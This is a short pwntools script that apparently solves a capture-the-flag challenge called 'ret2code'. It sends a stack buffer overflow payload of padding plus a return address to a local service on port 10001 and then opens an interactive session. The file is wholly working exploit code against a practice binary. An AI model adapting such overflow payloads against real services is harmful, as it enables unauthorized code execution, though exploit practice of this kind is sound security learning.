from pwn import *

# r = process('../ret2code/share/ret2code')
r = remote('127.0.0.1', 10001)

payload = b'A' * (0xa + 8) + p64(0x401157)

r.sendlineafter('Send me a message: ', payload)
r.interactive()
